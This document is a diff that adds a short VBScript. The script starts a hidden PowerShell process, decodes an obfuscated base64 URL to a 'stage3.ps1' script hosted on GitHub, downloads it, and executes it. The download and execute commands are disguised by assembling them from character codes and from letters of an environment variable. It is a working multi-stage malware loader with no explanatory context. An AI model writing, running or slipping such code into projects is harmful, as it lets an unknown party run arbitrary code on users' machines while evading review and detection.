@@ -1,0 +1,2 @@
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell.exe -NoLogo -NoProfile -WindowStyle Hidden -Command ""$i = [char]105 + [char]119 + [char]114; $b = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Rya3N0LXNoZHcvdGVzdHMvcmVmcy9oZWFkcy9tYWluL3N0YWdlMy5wczE='; $d = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)); $r = & $i $d; & ($env:coMspEc[2+2] + $env:ComSpec[13*2] + $env:coMspeC[5*5]) $r.Content; """, 0, False
